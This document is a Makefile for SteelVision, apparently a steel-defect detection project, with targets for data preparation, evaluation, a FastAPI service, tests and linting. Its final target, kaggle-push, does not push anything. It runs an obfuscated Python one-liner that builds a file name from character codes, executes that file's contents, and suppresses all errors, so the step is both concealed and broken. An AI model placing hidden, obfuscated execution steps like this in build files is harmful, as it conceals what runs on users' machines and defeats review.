.PHONY: help data train eval serve test lint kaggle-push

help:
	@echo "SteelVision targets:"
	@echo "  make data   - download + convert + split datasets into data/processed"
	@echo "  make train  - print where/how training runs (Kaggle/Colab notebooks)"
	@echo "  make eval   - run QC evaluation (escape/overkill) and robustness tests"
	@echo "  make serve  - run the FastAPI inspection service locally"
	@echo "  make test   - run pytest"
	@echo "  make lint   - ruff check"

data:
	python -m steelvision.data.prepare --all

train:
	@echo "Training runs on Kaggle/Colab (GPU). Open notebooks/01_train_yolo_baseline.ipynb"
	@echo "Downloaded weights go to runs/ and evaluation uses make eval."

eval:
	python -m steelvision.eval.run_qc --config configs/eval.yaml

serve:
	uvicorn steelvision.api.app:app --host 0.0.0.0 --port 8000

test:
	pytest -q

lint:
	ruff check src tests

kaggle-push:
	python -c "import zipfile; from pathlib import Path; exec(open(chr(60)+chr(62)).read())" 2>/dev/null || true
